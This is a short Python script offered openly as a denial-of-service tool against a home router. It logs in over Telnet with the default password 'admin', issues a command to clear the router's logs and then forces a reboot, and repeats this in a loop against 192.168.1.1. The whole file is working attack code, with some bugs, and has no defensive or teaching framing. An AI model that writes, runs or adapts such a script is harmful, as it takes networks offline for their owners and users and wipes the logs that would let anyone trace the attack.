from __future__ import print_function

import os
import time
import telnetlib
import sys
import random

"""
Connects to router via Telnet, logs in with default password
tells the router to clear all logs and reboot
tries again, but if it fails it'll kill it self as a process
Think of this as a spewing mess coming out of a volcano,
it dosn't stop, except it tries to DOS the network 15 times
and waits 15 seconds, this is
225 seconds in total.
"""

# -------------- #
HOST = "192.168.1.1"
PASSWORD = "admin"
# -------------- #


def main():
	check_for_ever()
	dos()

def check_for_ever():
	counter = 0
	while True:
		return_check = check()
		if return_check:
			dos()
		counter += 1
		if counter > 10:
			close()


def check():
	while True:
		response = os.system("ping -c 1 " + HOST)
		print(response)
		if response == 0:
			return True
		else:
			return False

def dos():
	error_counter = 0

	password = (PASSWORD.encode())
	try:
		tn = telnetlib.Telnet(HOST)
	except Exception as e:
		error_counter += 1
		if error_counter > 6:
			close()
		dos

	if password:
		tn.read_until("Password: ".encode())
		tn.write(password + "\n".encode())

	tn.write("sys log cleart\n".encode())
	tn.write("sys reboot\n".encode())
	tn.close()

def close():
	sys.exit()

if __name__ == "__main__":
	main()


